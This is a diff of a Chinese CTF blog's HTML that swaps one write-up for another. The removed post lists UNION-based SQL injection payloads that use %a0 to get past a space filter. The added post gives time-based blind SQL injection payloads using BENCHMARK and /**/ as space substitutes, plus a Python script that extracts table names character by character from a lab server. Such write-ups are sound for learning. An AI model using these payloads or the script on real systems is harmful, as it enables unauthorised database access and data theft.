@@ -24,32 +24,28 @@
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"show_result":true,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
 
-    <meta name="description" content="SQL注入 FUZZ看屏蔽什么 空格 %a0‘’ %27  发现有4列，同时发现后面要加上引号闭合（为啥不用注释呢？）  2、用%a0绕过，输入1’%a0union%a0select%a01,2,3’，发现有4列，同时发现后面要加上引号闭合3、1%27%a0union%a0select%a01,2,3,4%27,回显1,2，34、查库名：1%27%a0union%a0select%a01,2,(s">
+    <meta name="description" content="JNCTF 热身赛 WPno_sleep过滤了sleep，空格，+   可以确定是SQL注入，判断数据库版本 1&#x27;&#x2F;**&#x2F;OR&#x2F;**&#x2F;BENCHMARK(1000000,MD5(&#x27;test&#x27;))&#x2F;**&#x2F;#  成功转圈 1&#x27;OR&#x2F;**&#x2F;IF(1&#x3D;1,BENCHMARK(500000000,MD5(&#x27;test&#x27;)),0)&#x2F;**&#x2F;  忘记写注释">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[NCTF 2018]滴!晨跑打卡">
-<meta property="og:url" content="http://example.com/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/index.html">
+<meta property="og:title" content="JNCTF 热身赛 WP">
+<meta property="og:url" content="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/index.html">
 <meta property="og:site_name" content="CTF学习笔记">
-<meta property="og:description" content="SQL注入 FUZZ看屏蔽什么 空格 %a0‘’ %27  发现有4列，同时发现后面要加上引号闭合（为啥不用注释呢？）  2、用%a0绕过，输入1’%a0union%a0select%a01,2,3’，发现有4列，同时发现后面要加上引号闭合3、1%27%a0union%a0select%a01,2,3,4%27,回显1,2，34、查库名：1%27%a0union%a0select%a01,2,(s">
+<meta property="og:description" content="JNCTF 热身赛 WPno_sleep过滤了sleep，空格，+   可以确定是SQL注入，判断数据库版本 1&#x27;&#x2F;**&#x2F;OR&#x2F;**&#x2F;BENCHMARK(1000000,MD5(&#x27;test&#x27;))&#x2F;**&#x2F;#  成功转圈 1&#x27;OR&#x2F;**&#x2F;IF(1&#x3D;1,BENCHMARK(500000000,MD5(&#x27;test&#x27;)),0)&#x2F;**&#x2F;  忘记写注释">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-171610.png">
-<meta property="og:image" content="http://example.com/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-174605.png">
-<meta property="article:published_time" content="2025-02-19T09:00:13.000Z">
-<meta property="article:modified_time" content="2025-02-19T09:57:03.320Z">
+<meta property="og:image" content="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/QQ20250316-184507.png">
+<meta property="article:published_time" content="2025-03-16T10:44:45.000Z">
+<meta property="article:modified_time" content="2025-03-16T12:33:31.454Z">
 <meta property="article:author" content="温柔刀">
-<meta property="article:tag" content="SQL注入">
-<meta property="article:tag" content="报错注入">
-<meta property="article:tag" content="空格绕过">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-171610.png">
+<meta name="twitter:image" content="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/QQ20250316-184507.png">
 
 
-<link rel="canonical" href="http://example.com/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/">
+<link rel="canonical" href="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/","path":"2025/02/19/NCTF-2018-滴-晨跑打卡/","title":"[NCTF 2018]滴!晨跑打卡"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/","path":"2025/03/16/JNCTF-热身赛-WP/","title":"JNCTF 热身赛 WP"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>[NCTF 2018]滴!晨跑打卡 | CTF学习笔记</title>
+<title>JNCTF 热身赛 WP | CTF学习笔记</title>
   
 
 
@@ -123,7 +119,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC-a0"><span class="nav-number">1.</span> <span class="nav-text">空格 %a0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E2%80%98%E2%80%99-27"><span class="nav-number">2.</span> <span class="nav-text">‘’ %27</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP"><span class="nav-number">1.</span> <span class="nav-text">JNCTF 热身赛 WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#no-sleep"><span class="nav-number">1.1.</span> <span class="nav-text">no_sleep</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -182,7 +178,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar_2.gif">
@@ -195,12 +191,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="[NCTF 2018]滴!晨跑打卡 | CTF学习笔记">
+      <meta itemprop="name" content="JNCTF 热身赛 WP | CTF学习笔记">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          [NCTF 2018]滴!晨跑打卡
+          JNCTF 热身赛 WP
         </h1>
 
         <div class="post-meta-container">
@@ -212,16 +208,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2025-02-19 17:00:13 / 修改时间：17:57:03" itemprop="dateCreated datePublished" datetime="2025-02-19T17:00:13+08:00">2025-02-19</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-        </span>
+      <time title="创建时间：2025-03-16 18:44:45 / 修改时间：20:33:31" itemprop="dateCreated datePublished" datetime="2025-03-16T18:44:45+08:00">2025-03-16</time>
     </span>
 
   
@@ -233,8 +220,8 @@
     </span>
     <span class="post-meta-item-text">Waline：</span>
   
-    <a title="waline" href="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/#waline" itemprop="discussionUrl">
-      <span class="post-comments-count waline-comment-count" data-path="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/" itemprop="commentCount"></span>
+    <a title="waline" href="/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -245,14 +232,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>154</span>
+      <span>418</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -262,14 +249,30 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><p>SQL注入<img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-171610.png" class="" title="QQ20250219-171610"></p>
-<p>FUZZ看屏蔽什么</p>
-<h1 id="空格-a0"><a href="#空格-a0" class="headerlink" title="空格 %a0"></a>空格 %a0</h1><h1 id="‘’-27"><a href="#‘’-27" class="headerlink" title="‘’ %27"></a>‘’ %27</h1><img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-174605.png" class="" title="QQ20250219-174605">
+    <div class="post-body" itemprop="articleBody"><h1 id="JNCTF-热身赛-WP"><a href="#JNCTF-热身赛-WP" class="headerlink" title="JNCTF 热身赛 WP"></a>JNCTF 热身赛 WP</h1><h2 id="no-sleep"><a href="#no-sleep" class="headerlink" title="no_sleep"></a>no_sleep</h2><p>过滤了sleep，空格，+</p>
+<img src="/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/QQ20250316-184507.png" class="" title="QQ20250316-184507">
 
-<p>发现有4列，同时发现后面要加上引号闭合（为啥不用注释呢？）</p>
-<blockquote>
-<p>2、用%a0绕过，输入1’%a0union%a0select%a01,2,3’，发现有4列，同时发现后面要加上引号闭合<br>3、1%27%a0union%a0select%a01,2,3,4%27,回显1,2，3<br>4、查库名：1%27%a0union%a0select%a01,2,(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),4%27<br>5、查表名：1%27%a0union%a0select%a01,2,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema&#x3D;database()),4%27<br>6、查列名：1%27%a0union%a0select%a01,2,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name&#x3D;‘pcnumber’),4%27 (报错)<br>7、查字段值：1%27%a0union%a0select%a01,2,(select%a0group_concat(flag)%a0from%a0pcnumber),4%27</p>
-</blockquote>
+<p>可以确定是SQL注入，判断数据库版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/BENCHMARK(1000000,MD5(&#x27;test&#x27;))/**/#</span><br></pre></td></tr></table></figure>
+
+<p>成功转圈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;OR/**/IF(1=1,BENCHMARK(500000000,MD5(&#x27;test&#x27;)),0)/**/</span><br></pre></td></tr></table></figure>
+
+<p>忘记写注释了砍死你</p>
+<p>这个试过了好像只有name可以注入</p>
+<p>sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/table_name/**/FROM/**/information_schema.tables/**/LIMIT/**/1),1,1))=65,BENCHMARK(1000000,MD5(&#x27;test&#x27;)),0)/**/#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=&#x27;CHARACTER_SETS&#x27;/**/LIMIT/**/1),1,1))=65,BENCHMARK(1000000,MD5(&#x27;test&#x27;)),0)/**/#&amp;</span><br></pre></td></tr></table></figure>
+
+<p>CHARACTER_SETS</p>
+<p>脚本好难写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 目标 URL</span><br><span class="line">url = &quot;http://172.18.137.75:32223/search.php&quot;</span><br><span class="line"></span><br><span class="line"># 请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;172.18.137.75:32223&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http://172.18.137.75:32223&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;keep-alive&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://172.18.137.75:32223/&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;Priority&quot;: &quot;u=0, i&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 遍历 ASCII 码范围（65 到 122）</span><br><span class="line">for ascii_value in range(65, 123):</span><br><span class="line">    # 动态构造 Payload</span><br><span class="line">    payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/table_name/**/FROM/**/information_schema.tables/**/LIMIT/**/1),4,1))=&#123;ascii_value&#125;,BENCHMARK(1000000,MD5(&#x27;test&#x27;)),0)/**/#&quot;      ##这个,4,1))的4自己改</span><br><span class="line"></span><br><span class="line">    # 请求体</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;name&quot;: payload,</span><br><span class="line">        &quot;pw&quot;: &quot;1&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 发送 POST 请求</span><br><span class="line">    try:</span><br><span class="line">        start_time = time.time()  # 记录请求开始时间</span><br><span class="line">        response = requests.post(url, headers=headers, data=data, timeout=10)  # 设置超时为 10 秒</span><br><span class="line">        end_time = time.time()  # 记录请求结束时间</span><br><span class="line"></span><br><span class="line">        response_time = end_time - start_time  # 计算响应时间</span><br><span class="line">        print(f&quot;测试 ASCII 值: &#123;ascii_value&#125; (字符: &#123;chr(ascii_value)&#125;), 响应时间: &#123;response_time:.2f&#125; 秒&quot;)</span><br><span class="line"></span><br><span class="line">        if response_time &gt; 3:  # 如果响应时间大于 3 秒</span><br><span class="line">            print(f&quot;OK: 字符 &#123;chr(ascii_value)&#125; 匹配&quot;)  # 输出匹配的字符</span><br><span class="line">            break  # 找到匹配字符后退出循环</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        print(f&quot;请求失败 (ASCII 值: &#123;ascii_value&#125;):&quot;, e)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=&#x27;CHARACTER_SETS&#x27;/**/LIMIT/**/1),1,1))=&#123;ascii_value&#125;,BENCHMARK(1000000,MD5(&#x27;test&#x27;)),0)/**/#&quot;</span><br></pre></td></tr></table></figure>
+
+<p>CHARACTER_SET_NAME</p>
+<p>1 2 3456789012345678</p>
 
     </div>
 
@@ -278,11 +281,6 @@
     
 
     <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
-              <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> 报错注入</a>
-              <a href="/tags/%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" rel="tag"><i class="fa fa-tag"></i> 空格绕过</a>
-          </div>
 
         
   <div class="social-like a2a_kit a2a_kit_size_32 a2a_default_style">
@@ -293,14 +291,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/" rel="prev" title="永远追不上的时间">
-                  <i class="fa fa-angle-left"></i> 永远追不上的时间
+                <a href="/2025/03/12/CTF%E8%AE%A1%E5%88%86%E5%B9%B3%E5%8F%B0%E5%BC%80%E5%8F%91/" rel="prev" title="CTF计分平台开发">
+                  <i class="fa fa-angle-left"></i> CTF计分平台开发
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2025/02/20/HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-HowToGetShell/" rel="next" title="[HUBUCTF 2022 新生赛]HowToGetShell">
-                  [HUBUCTF 2022 新生赛]HowToGetShell <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
@@ -382,7 +377,7 @@
 
 
 
-<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"comment-three-tau.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"说两句吧~","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":true,"comment_count":true,"requiredFields":["nick","mail"],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/"}</script>
+<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"comment-three-tau.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"说两句吧~","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":true,"comment_count":true,"requiredFields":["nick","mail"],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/"}</script>
 <link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
 <script>
 document.addEventListener('page:loaded', () => {
